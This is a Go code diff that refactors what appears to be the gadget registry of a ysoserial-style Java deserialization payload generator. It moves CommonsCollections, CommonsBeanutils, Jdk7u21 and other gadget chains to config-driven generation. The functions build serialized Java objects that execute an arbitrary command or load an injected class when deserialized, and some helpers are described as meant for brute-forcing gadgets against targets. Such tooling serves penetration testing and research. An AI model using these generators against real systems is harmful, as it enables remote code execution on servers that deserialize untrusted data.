@@ -30,81 +30,35 @@ func (g *GadgetInfo) IsSupportTemplate() bool {
 	return g.SupportTemplateImpl
 }
 
-var AllGadgets = map[string]*GadgetInfo{
-	//BeanShell1GadgetName:              {Name: BeanShell1GadgetName, NameVerbose: "BeanShell1", Help: "", SupportTemplate: false},
-	//Click1GadgetName:                  {Name: Click1GadgetName, NameVerbose: "Click1", Help: "", SupportTemplate: true},
-	//CommonsBeanutils1GadgetName:       {Name: CommonsBeanutils1GadgetName, NameVerbose: "CommonsBeanutils1", Help: "", SupportTemplate: true},
-	//CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
-	//CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
-	//CommonsCollections1GadgetName:     {Name: CommonsCollections1GadgetName, NameVerbose: "CommonsCollections1", Help: "", SupportTemplate: false},
-	//CommonsCollections2GadgetName:     {Name: CommonsCollections2GadgetName, NameVerbose: "CommonsCollections2", Help: "", SupportTemplate: true},
-	//CommonsCollections3GadgetName:     {Name: CommonsCollections3GadgetName, NameVerbose: "CommonsCollections3", Help: "", SupportTemplate: true},
-	//CommonsCollections4GadgetName:     {Name: CommonsCollections4GadgetName, NameVerbose: "CommonsCollections4", Help: "", SupportTemplate: true},
-	//CommonsCollections5GadgetName:     {Name: CommonsCollections5GadgetName, NameVerbose: "CommonsCollections5", Help: "", SupportTemplate: false},
-	//CommonsCollections6GadgetName:     {Name: CommonsCollections6GadgetName, NameVerbose: "CommonsCollections6", Help: "", SupportTemplate: false},
-	//CommonsCollections7GadgetName:     {Name: CommonsCollections7GadgetName, NameVerbose: "CommonsCollections7", Help: "", SupportTemplate: false},
-	//CommonsCollections8GadgetName:     {Name: CommonsCollections8GadgetName, NameVerbose: "CommonsCollections8", Help: "", SupportTemplate: true},
-	//CommonsCollectionsK1GadgetName:    {Name: CommonsCollectionsK1GadgetName, NameVerbose: "CommonsCollectionsK1", Help: "", SupportTemplate: true},
-	//CommonsCollectionsK2GadgetName:    {Name: CommonsCollectionsK2GadgetName, NameVerbose: "CommonsCollectionsK2", Help: "", SupportTemplate: true},
-	//CommonsCollectionsK3GadgetName:    {Name: CommonsCollectionsK3GadgetName, NameVerbose: "CommonsCollectionsK3", Help: "", SupportTemplate: false},
-	//CommonsCollectionsK4GadgetName:    {Name: CommonsCollectionsK4GadgetName, NameVerbose: "CommonsCollectionsK4", Help: "", SupportTemplate: false},
-	//Groovy1GadgetName:                 {Name: Groovy1GadgetName, NameVerbose: "Groovy1", Help: "", SupportTemplate: false},
-	//JBossInterceptors1GadgetName:      {Name: JBossInterceptors1GadgetName, NameVerbose: "JBossInterceptors1", Help: "", SupportTemplate: true},
-	//JSON1GadgetName:                   {Name: JSON1GadgetName, NameVerbose: "JSON1", Help: "", SupportTemplate: true},
-	//JavassistWeld1GadgetName:          {Name: JavassistWeld1GadgetName, NameVerbose: "JavassistWeld1", Help: "", SupportTemplate: true},
-	//Jdk7u21GadgetName:                 {Name: Jdk7u21GadgetName, NameVerbose: "Jdk7u21", Help: "", SupportTemplate: true},
-	//Jdk8u20GadgetName:                 {Name: Jdk8u20GadgetName, NameVerbose: "Jdk8u20", Help: "", SupportTemplate: true},
-	//URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "通过URL对象触发dnslog", SupportTemplate: false},
-	//FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "通过URLDNS这个gadget探测class,进而判断gadget", SupportTemplate: false},
-}
+var AllGadgets = map[GadgetType]*GadgetInfo{}
 
 func init() {
-	RegisterGadget(GetBeanShell1JavaObject, BeanShell1GadgetName, "BeanShell1", "")
-	RegisterGadget(GetClick1JavaObject, Click1GadgetName, "Click1", "")
-	RegisterGadget(GetCommonsBeanutils1JavaObject, CommonsBeanutils1GadgetName, "CommonsBeanutils1", "")
-	RegisterGadget(GetCommonsBeanutils183NOCCJavaObject, CommonsBeanutils183NOCCGadgetName, "CommonsBeanutils183NOCC", "")
-	RegisterGadget(GetCommonsBeanutils192NOCCJavaObject, CommonsBeanutils192NOCCGadgetName, "CommonsBeanutils192NOCC", "")
-	RegisterGadget(GetCommonsCollections1JavaObject, CommonsCollections1GadgetName, "CommonsCollections1", "")
-	RegisterGadget(GetCommonsCollections2JavaObject, CommonsCollections2GadgetName, "CommonsCollections2", "")
-	RegisterGadget(GetCommonsCollections3JavaObject, CommonsCollections3GadgetName, "CommonsCollections3", "")
-	RegisterGadget(GetCommonsCollections4JavaObject, CommonsCollections4GadgetName, "CommonsCollections4", "")
-	RegisterGadget(GetCommonsCollections5JavaObject, CommonsCollections5GadgetName, "CommonsCollections5", "")
-	RegisterGadget(GetCommonsCollections6JavaObject, CommonsCollections6GadgetName, "CommonsCollections6", "")
-	RegisterGadget(GetCommonsCollections7JavaObject, CommonsCollections7GadgetName, "CommonsCollections7", "")
-	RegisterGadget(GetCommonsCollections8JavaObject, CommonsCollections8GadgetName, "CommonsCollections8", "")
-	RegisterGadget(GetCommonsCollectionsK1JavaObject, CommonsCollectionsK1GadgetName, "CommonsCollectionsK1", "")
-	RegisterGadget(GetCommonsCollectionsK2JavaObject, CommonsCollectionsK2GadgetName, "CommonsCollectionsK2", "")
-	RegisterGadget(GetCommonsCollectionsK3JavaObject, CommonsCollectionsK3GadgetName, "CommonsCollectionsK3", "")
-	RegisterGadget(GetCommonsCollectionsK4JavaObject, CommonsCollectionsK4GadgetName, "CommonsCollectionsK4", "")
-	RegisterGadget(GetGroovy1JavaObject, Groovy1GadgetName, "Groovy1", "")
-	RegisterGadget(GetJBossInterceptors1JavaObject, JBossInterceptors1GadgetName, "JBossInterceptors1", "")
-	RegisterGadget(GetJSON1JavaObject, JSON1GadgetName, "JSON1", "")
-	RegisterGadget(GetJavassistWeld1JavaObject, JavassistWeld1GadgetName, "JavassistWeld1", "")
-	RegisterGadget(GetJdk7u21JavaObject, Jdk7u21GadgetName, "Jdk7u21", "")
-	RegisterGadget(GetJdk8u20JavaObject, Jdk8u20GadgetName, "Jdk8u20", "")
-	RegisterGadget(GetURLDNSJavaObject, URLDNS, URLDNS, "")
-	RegisterGadget(GetFindGadgetByDNSJavaObject, FindGadgetByDNS, FindGadgetByDNS, "")
-}
-func RegisterGadget(f any, name string, verbose string, help string) {
-	var supportTemplate = false
-	funType := reflect.TypeOf(f)
-	if funType.IsVariadic() && funType.NumIn() == 1 && funType.In(0).Kind() == reflect.Slice && funType.Kind() == reflect.Func {
-		supportTemplate = true
-	} else {
-		if funType.NumIn() > 0 && funType.In(0).Kind() == reflect.String && funType.Kind() == reflect.Func {
-			supportTemplate = false
+	for name, cfg := range YsoConfigInstance.Gadgets {
+		name := name
+		cfg := cfg
+		var f any
+		if cfg.IsTemplateImpl {
+			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
+				var anyOpts []any
+				for _, opt := range options {
+					anyOpts = append(anyOpts, opt)
+				}
+				return GenerateGadget(name, anyOpts...)
+			}
 		} else {
-			panic("gadget function must be func(options ...GenClassOptionFun) (*JavaObject, error) or func(cmd string) (*JavaObject, error)")
+			f = func(cmd string) (*JavaObject, error) {
+				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+			}
 		}
-	}
-	AllGadgets[name] = &GadgetInfo{
-		Name:                name,
-		NameVerbose:         verbose,
-		Generator:           f,
-		GeneratorName:       name,
-		Help:                help,
-		SupportTemplateImpl: supportTemplate,
-		YakFun:              fmt.Sprintf("Get%sJavaObject", name),
+		AllGadgets[name] = &GadgetInfo{
+			Name:                string(name),
+			NameVerbose:         string(name),
+			Generator:           f,
+			GeneratorName:       string(name),
+			Help:                cfg.Desc,
+			SupportTemplateImpl: cfg.IsTemplateImpl,
+			YakFun:              fmt.Sprintf("Get%sJavaObject", name),
+		}
 	}
 }
 
@@ -138,15 +92,16 @@ func SetTransformChainType(s string, arg1 string, args ...string) GenGadgetOptio
 		config.Args = append([]string{arg1}, args...)
 	}
 }
-func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
+
+func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
 	genConfig := &GenerateGadgetConfig{}
-	genClassCfg := NewClassConfig()
+	var genClassesOpt []GenClassOptionFun
 	for _, opt := range opts {
-		switch f := opt.(type) {
+		switch f := any(opt).(type) {
 		case GenGadgetOptionFun:
 			f(genConfig)
 		case GenClassOptionFun:
-			f(genClassCfg)
+			genClassesOpt = append(genClassesOpt, f)
 		default:
 			return nil, utils.Errorf("unknown option type: %v(need type GenGadgetOptionFun or GenClassOptionFun)", reflect.TypeOf(opt).String())
 		}
@@ -155,16 +110,13 @@ func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
 	if !ok {
 		return nil, utils.Errorf("not found template: %s", name)
 	}
-	if cfg.IsTemplate {
+	if cfg.IsTemplateImpl {
 		templ := cfg.Template
-		if genClassCfg.ClassType == "" {
-			genClassCfg.ClassType = RuntimeExecClass
-		}
-		classObj, err := genClassCfg.GenerateClassObject()
+		classObj, err := GenerateClass(genClassesOpt...)
 		if err != nil {
 			return nil, err
 		}
-		classObj, err = NewClassConfig(SetClassBytes(classObj.Bytes())).GenerateClassObject()
+		classObj, err = GenerateClassWithType(ClassTemplateImplClassLoader, SetClassBytes(classObj.Bytes())) // load target class by TemplateImpl loader that can load any class
 		if err != nil {
 			return nil, err
 		}
@@ -175,7 +127,7 @@ func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
 		obj := objs[0]
 		err = SetJavaObjectClass(obj, classObj)
 		if err != nil {
-			return nil, utils.Errorf("set class object failed: %v", err)
+			return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
 		}
 		return verboseWrapper(obj, AllGadgets[name]), nil
 	} else {
@@ -206,57 +158,6 @@ func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
 		}
 		return verboseWrapper(obj, AllGadgets[name]), nil
 	}
-}
-
-func ConfigJavaObject(name string, options ...GenClassOptionFun) (*JavaObject, error) {
-	cfg, ok := YsoConfigInstance.Gadgets[name]
-	if !ok {
-		return nil, utils.Errorf("gadget %s not found", name)
-	}
-	if !cfg.IsTemplate {
-		return nil, utils.Errorf("gadget %s not support template", name)
-	}
-	templ := cfg.Template
-	config := NewClassConfig(options...)
-	if config.ClassType == "" {
-		config.ClassType = RuntimeExecClass
-	}
-	classObj, err := config.GenerateClassObject()
-	if err != nil {
-		return nil, err
-	}
-	objs, err := yserx.ParseJavaSerialized(templ)
-	if err != nil {
-		return nil, err
-	}
-	obj := objs[0]
-	err = SetJavaObjectClass(obj, classObj)
-	if err != nil {
-		return nil, utils.Errorf("set class object failed: %v", err)
-	}
-	return verboseWrapper(obj, AllGadgets[name]), nil
-}
-func setCommandForRuntimeExecGadget(name string, cmd string) (*JavaObject, error) {
-	if YsoConfigInstance == nil || YsoConfigInstance.Gadgets == nil {
-		return nil, utils.Error("config not init")
-	}
-	gadgetInfo, ok := YsoConfigInstance.Gadgets[name]
-	if !ok {
-		return nil, utils.Errorf("gadget %s not found", name)
-	}
-	objs, err := yserx.ParseJavaSerialized(gadgetInfo.Template)
-	if err != nil {
-		return nil, err
-	}
-	if len(objs) <= 0 {
-		return nil, utils.Error("parse gadget error")
-	}
-	obj := objs[0]
-	err = ReplaceStringInJavaSerilizable(obj, "{{command}}", cmd, 1)
-	if err != nil {
-		return nil, err
-	}
-	return verboseWrapper(obj, AllGadgets[name]), nil
 }
 
 // GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
@@ -296,23 +197,7 @@ func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
-	objs, err := yserx.ParseJavaSerialized(template_ser_BeanShell1)
-	if err != nil {
-		return nil, err
-	}
-	if len(objs) <= 0 {
-		return nil, utils.Error("parse gadget error")
-	}
-	obj := objs[0]
-	err = ReplaceStringInJavaSerilizable(obj, "whoami1", cmd, 1)
-	if err != nil {
-		return nil, err
-	}
-	//err = ReplaceStringInJavaSerilizable(obj, `"whoami1"`, cmd, 1)
-	//if err != nil {
-	//	return nil, err
-	//}
-	return verboseWrapper(obj, AllGadgets["BeanShell1"]), nil
+	return GenerateGadget(GadgetBeanShell1, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
@@ -328,7 +213,7 @@ func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollections1", cmd)
+	return GenerateGadget(GadgetCommonsCollections1, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
@@ -344,7 +229,7 @@ func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollections5", cmd)
+	return GenerateGadget(GadgetCommonsCollections5, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
@@ -360,7 +245,7 @@ func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollections6", cmd)
+	return GenerateGadget(GadgetCommonsCollections6, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
@@ -376,7 +261,7 @@ func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollections7", cmd)
+	return GenerateGadget(GadgetCommonsCollections7, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
@@ -392,7 +277,7 @@ func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollectionsK3", cmd)
+	return GenerateGadget(GadgetCommonsCollectionsK3, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
@@ -408,7 +293,7 @@ func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("CommonsCollectionsK4", cmd)
+	return GenerateGadget(GadgetCommonsCollectionsK4, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
@@ -424,7 +309,7 @@ func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget("Groovy1", cmd)
+	return GenerateGadget(GadgetGroovy1, SetTransformChainType("raw_cmd", cmd))
 }
 
 // GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
@@ -445,7 +330,7 @@ func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
 //
 // ```
 func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("Click1", options...)
+	return GenerateGadget(GadgetClick1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
@@ -466,7 +351,7 @@ func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsBeanutils1", options...)
+	return GenerateGadget(GadgetCommonsBeanutils1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
@@ -488,7 +373,7 @@ func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, 
 // )
 // ```
 func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsBeanutils183NOCC", options...)
+	return GenerateGadget(GadgetCommonsBeanutils2_183, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
@@ -510,7 +395,7 @@ func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // )
 // ```
 func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsBeanutils192NOCC", options...)
+	return GenerateGadget(GadgetCommonsBeanutils2, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -531,7 +416,7 @@ func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // )
 // ```
 func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollections2", options...)
+	return GenerateGadget(GadgetCommonsCollections2, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
@@ -552,7 +437,7 @@ func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollections3", options...)
+	return GenerateGadget(GadgetCommonsCollections3, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -573,7 +458,7 @@ func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollections4", options...)
+	return GenerateGadget(GadgetCommonsCollections4, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -594,7 +479,7 @@ func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollections8", options...)
+	return GenerateGadget(GadgetCommonsCollections8, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
@@ -615,7 +500,7 @@ func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollectionsK1", options...)
+	return GenerateGadget(GadgetCommonsCollectionsK1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -636,7 +521,7 @@ func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // )
 // ```
 func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("CommonsCollectionsK2", options...)
+	return GenerateGadget(GadgetCommonsCollectionsK2, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
@@ -657,7 +542,7 @@ func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // )
 // ```
 func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("JBossInterceptors1", options...)
+	return GenerateGadget(GadgetJBossInterceptors1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
@@ -678,7 +563,7 @@ func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject,
 // )
 // ```
 func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("JSON1", options...)
+	return GenerateGadget(GadgetJSON1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
@@ -706,7 +591,7 @@ func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, err
 	//obj := objs[0]
 	//return verboseWrapper(obj, AllGadgets["JavassistWeld1"]), nil
 
-	return ConfigJavaObject("JavassistWeld1", options...)
+	return GenerateGadget(GadgetJavassistWeld1, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
@@ -727,7 +612,7 @@ func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, err
 // )
 // ```
 func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("Jdk7u21", options...)
+	return GenerateGadget(GadgetJdk7u21, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
@@ -748,7 +633,7 @@ func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return ConfigJavaObject("Jdk8u20", options...)
+	return GenerateGadget(GadgetJdk8u20, utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
@@ -886,12 +771,29 @@ func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 // ```
 // dump(yso.GetAllGadget())
 // ```
+
 func GetAllGadget() []interface{} {
-	var alGadget []any
-	for _, gadget := range AllGadgets {
-		alGadget = append(alGadget, gadget.Generator)
+	var allGadget []any
+	for name, cfg := range YsoConfigInstance.Gadgets {
+		name := name
+		cfg := cfg
+		var f any
+		if cfg.IsTemplateImpl {
+			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
+				anyOpts := []any{}
+				for _, opt := range options {
+					anyOpts = append(anyOpts, opt)
+				}
+				return GenerateGadget(name, anyOpts...)
+			}
+		} else {
+			f = func(cmd string) (*JavaObject, error) {
+				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+			}
+		}
+		allGadget = append(allGadget, f)
 	}
-	return alGadget
+	return allGadget
 }
 
 // GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
@@ -913,13 +815,22 @@ func GetAllGadget() []interface{} {
 //
 // ```
 func GetAllTemplatesGadget() []TemplatesGadget {
-	var alGadget []TemplatesGadget
-	for _, gadget := range AllGadgets {
-		if gadget.SupportTemplateImpl {
-			alGadget = append(alGadget, gadget.Generator.(func(options ...GenClassOptionFun) (*JavaObject, error)))
+	var allGadget []TemplatesGadget
+	for name, cfg := range YsoConfigInstance.Gadgets {
+		name := name
+		cfg := cfg
+		if !cfg.IsTemplateImpl {
+			continue
 		}
+		allGadget = append(allGadget, func(options ...GenClassOptionFun) (*JavaObject, error) {
+			anyOpts := []any{}
+			for _, opt := range options {
+				anyOpts = append(anyOpts, opt)
+			}
+			return GenerateGadget(name, anyOpts...)
+		})
 	}
-	return alGadget
+	return allGadget
 }
 
 // GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
@@ -941,11 +852,16 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 //
 // ```
 func GetAllRuntimeExecGadget() []RuntimeExecGadget {
-	var alGadget []RuntimeExecGadget
-	for _, gadget := range AllGadgets {
-		if !gadget.SupportTemplateImpl {
-			alGadget = append(alGadget, gadget.Generator.(func(cmd string) (*JavaObject, error)))
+	var allGadget []RuntimeExecGadget
+	for name, cfg := range YsoConfigInstance.Gadgets {
+		name := name
+		cfg := cfg
+		if cfg.IsTemplateImpl {
+			continue
 		}
+		allGadget = append(allGadget, func(cmd string) (*JavaObject, error) {
+			return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+		})
 	}
-	return alGadget
+	return allGadget
 }
